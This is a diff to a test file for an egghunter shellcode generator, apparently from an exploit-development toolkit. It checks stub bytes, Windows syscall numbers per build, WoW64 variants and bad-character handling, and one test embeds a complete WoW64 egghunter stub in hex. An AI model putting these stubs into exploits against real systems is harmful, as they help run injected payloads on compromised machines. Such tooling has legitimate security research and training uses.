@@ -2,7 +2,8 @@ import { describe, expect, test } from "vitest";
 import { buildEgghunter } from "../src/commands/egghunter";
 
 const NO_BADCHARS: number[] = [];
-const DEFAULTS = { badchars: NO_BADCHARS, os: "win10" as const, syscall: null } as const;
+const DEFAULTS = { badchars: NO_BADCHARS, os: "win10", syscall: null };
+const XP = { badchars: NO_BADCHARS, os: "xp", syscall: null };
 
 describe("NtAccess egghunter", () => {
   test("generates 34-byte stub with tag embedded", () => {
@@ -57,24 +58,47 @@ describe("NtAccess egghunter", () => {
     expect(result.bytes[9]).toBe(0x01);
   });
 
-  test("WoW64 variant uses inc ecx (0x41) instead of inc edx (0x42)", () => {
-    const standard = buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: false, ...DEFAULTS });
+  test("WoW64 variant matches the stub that found an egg in a WOW64 process", () => {
+    // Run on Windows 11 x64 with tests/manual/egghunter_wow64; exit code 1337 = egg reached.
     const wow64 = buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: true, ...DEFAULTS });
-    expect(standard.bytes[5]).toBe(0x42); // inc edx
-    expect(wow64.bytes[5]).toBe(0x41);    // inc ecx
+    const hex = wow64.bytes.map((b) => b.toString(16).toUpperCase().padStart(2, "0")).join("");
+    expect(hex).toBe("33DB53535353535353535353B3C06681CAFF0F425252B82900000064FF135A5A3C0574EAB8573030548BFAAF75E5AF75E2FFE7");
+    expect(wow64.syscallUsed).toBe(0x29);
   });
 
-  test("WoW64 variant uses ecx-based register set", () => {
+  test("WoW64 variant has no int 0x2e", () => {
     const wow64 = buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: true, ...DEFAULTS });
-    // or cx, 0x0fff: 66 81 c9 ff 0f
-    expect(wow64.bytes[2]).toBe(0xc9);
-    // push ecx: 51
-    expect(wow64.bytes[6]).toBe(0x51);
-    // pop ecx: 59
-    expect(wow64.bytes[16]).toBe(0x59);
-    // mov edi, ecx: 8b f9
-    expect(wow64.bytes[24]).toBe(0x8b);
-    expect(wow64.bytes[25]).toBe(0xf9);
+    const text = wow64.bytes.join(",");
+    expect(text).not.toContain([0xcd, 0x2e].join(","));
+  });
+
+  test("WoW64 explicit syscall is patched at offset 23", () => {
+    const wow64 = buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: true, badchars: [0x26], os: null, syscall: 0x26 });
+    expect(wow64.bytes.slice(22, 27)).toEqual([0xb8, 0x26, 0x00, 0x00, 0x00]);
+    expect(wow64.badcharHits).toEqual(["byte 0x26 at offset 23 in ntaccess wow64 egghunter"]);
+  });
+
+  test("os table resolves native numbers per build", () => {
+    const pick = (os: string) => buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: false, badchars: NO_BADCHARS, os, syscall: null });
+    expect(pick("xp").syscallUsed).toBe(0x02);
+    expect(pick("win8.1").syscallUsed).toBe(0x1af);
+    expect(pick("win10-1507").syscallUsed).toBe(0x1b7);
+    expect(pick("WIN10-1909").syscallUsed).toBe(0x1c6);
+    expect(pick("19041").syscallUsed).toBe(0x1c8);
+    expect(pick("win10-22h2").syscallUsed).toBe(0x1c9);
+    expect(pick("win10-2004").osWarning).toBeNull();
+  });
+
+  test("os with no native kernel falls back with a warning", () => {
+    const result = buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: false, badchars: NO_BADCHARS, os: "win11", syscall: null });
+    expect(result.syscallUsed).toBe(0x1c9);
+    expect(result.osWarning).toContain("No NtAccessCheckAndAuditAlarm number for Windows 11 in this stub");
+  });
+
+  test("WoW64 on Windows 7 falls back with a warning", () => {
+    const result = buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: true, badchars: NO_BADCHARS, os: "win7", syscall: null });
+    expect(result.syscallUsed).toBe(0x29);
+    expect(result.osWarning).toContain("Windows 7");
   });
 
   test("reports badchar violations in stub bytes", () => {
@@ -94,7 +118,7 @@ describe("NtAccess egghunter", () => {
 
 describe("NtDisplayString egghunter", () => {
   test("generates 32-byte stub with tag embedded", () => {
-    const result = buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, ...DEFAULTS });
+    const result = buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, ...XP });
     expect(result.size).toBe(32);
     expect(result.badcharHits).toEqual([]);
     // Tag at offset 18
@@ -105,7 +129,7 @@ describe("NtDisplayString egghunter", () => {
   });
 
   test("uses push imm8 / pop eax for syscall number", () => {
-    const result = buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, ...DEFAULTS });
+    const result = buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, ...XP });
     // push 0x43 at offset 7-8, pop eax at offset 9
     expect(result.bytes[7]).toBe(0x6a);  // push imm8
     expect(result.bytes[8]).toBe(0x43);  // NtDisplayString syscall
@@ -121,26 +145,42 @@ describe("NtDisplayString egghunter", () => {
   });
 
   test("is null-free with default syscall", () => {
-    const result = buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, badchars: [0x00], os: "win10", syscall: null });
+    const result = buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, badchars: [0x00], os: "xp", syscall: null });
     expect(result.badcharHits).toEqual([]);
   });
 
   test("is 2 bytes shorter than ntaccess", () => {
     const ntaccess = buildEgghunter({ tag: "W00T", mode: "ntaccess", wow64: false, ...DEFAULTS });
-    const ntdisplay = buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, ...DEFAULTS });
+    const ntdisplay = buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, ...XP });
     expect(ntaccess.size - ntdisplay.size).toBe(2);
   });
 
-  test("WoW64 variant uses ecx instead of edx", () => {
-    const standard = buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, ...DEFAULTS });
-    const wow64 = buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: true, ...DEFAULTS });
-    expect(standard.bytes[5]).toBe(0x42); // inc edx
-    expect(wow64.bytes[5]).toBe(0x41);    // inc ecx
-    expect(wow64.size).toBe(32);
+  test("has no WoW64 variant", () => {
+    expect(() => buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: true, ...XP })).toThrow("ntdisplay has no WOW64 stub");
+  });
+
+  test("win7 preset uses NtDisplayString 0x6D", () => {
+    const result = buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, badchars: NO_BADCHARS, os: "win7", syscall: null });
+    expect(result.bytes[8]).toBe(0x6d);
+    expect(result.osWarning).toBeNull();
+  });
+
+  test("rejects a number that does not fit push imm8", () => {
+    expect(() => buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, badchars: NO_BADCHARS, os: "vista", syscall: null })).toThrow("0x80 (Windows Vista) does not fit");
+  });
+
+  test("rejects the Windows 10 number, which needs imm32", () => {
+    expect(() => buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, badchars: NO_BADCHARS, os: "win10", syscall: null })).toThrow("0x143 (Windows 10 22H2) does not fit");
+  });
+
+  test("no os falls back to XP with a warning", () => {
+    const result = buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, badchars: NO_BADCHARS, os: null, syscall: null });
+    expect(result.syscallUsed).toBe(0x43);
+    expect(result.osWarning).toContain("No os given; using 0x43 (Windows XP)");
   });
 
   test("ends with jmp edi (FF E7)", () => {
-    const result = buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, ...DEFAULTS });
+    const result = buildEgghunter({ tag: "W00T", mode: "ntdisplay", wow64: false, ...XP });
     expect(result.bytes[result.size - 2]).toBe(0xff);
     expect(result.bytes[result.size - 1]).toBe(0xe7);
   });
